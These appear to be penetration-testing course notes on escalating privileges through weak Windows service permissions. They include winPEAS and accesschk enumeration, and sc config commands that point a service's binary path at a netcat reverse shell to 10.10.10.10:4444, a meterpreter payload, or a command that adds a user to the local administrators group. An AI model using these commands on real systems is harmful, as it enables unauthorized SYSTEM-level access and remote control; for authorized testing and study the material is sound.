Each service has an ACL which defines certain service-specific  
permissions.  
Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG,  
SERVICE_QUERY_STATUS).  
Some may be useful (e.g. SERVICE_STOP, SERVICE_START).  
Some are dangerous (e.g. SERVICE_CHANGE_CONFIG,  
SERVICE_ALL_ACCESS)

If our user has permission to change the configuration of a  
service which runs with SYSTEM privileges, we can change  
the executable the service uses to one of our own.  
Potential Rabbit Hole: If you can change a service  
configuration but cannot stop/start the service, you may not  
be able to escalate privileges!

1.Run winPEAS to check for service misconfigurations:  
`.\winPEASany.exe quiet servicesinfo`

> 2. Note that we can modify the “daclsvc” service.
>     
>     > > YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
>     

3.We can confirm this with accesschk.exe:  
`.\accesschk.exe /accepteula -uwcqv user daclsvc`

4.Check the current configuration of the service:  
`sc qc daclsvc`

5.Check the current status of the service:  
`sc query daclsvc`

In the scenario where the "Authenticated users" group possesses **SERVICE_ALL_ACCESS** on a service, modification of the service's executable binary is possible. To modify and execute **sc**:

6.Reconfigure the service to use our reverse shell executable:  
`sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`  
or:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Restart service

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privileges can be escalated through various permissions:

- **SERVICE_CHANGE_CONFIG**: Allows reconfiguration of the service binary.
- **WRITE_DAC**: Enables permission reconfiguration, leading to the ability to change service configurations.
- **WRITE_OWNER**: Permits ownership acquisition and permission reconfiguration.
- **GENERIC_WRITE**: Inherits the ability to change service configurations.
- **GENERIC_ALL**: Also inherits the ability to change service configurations.

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.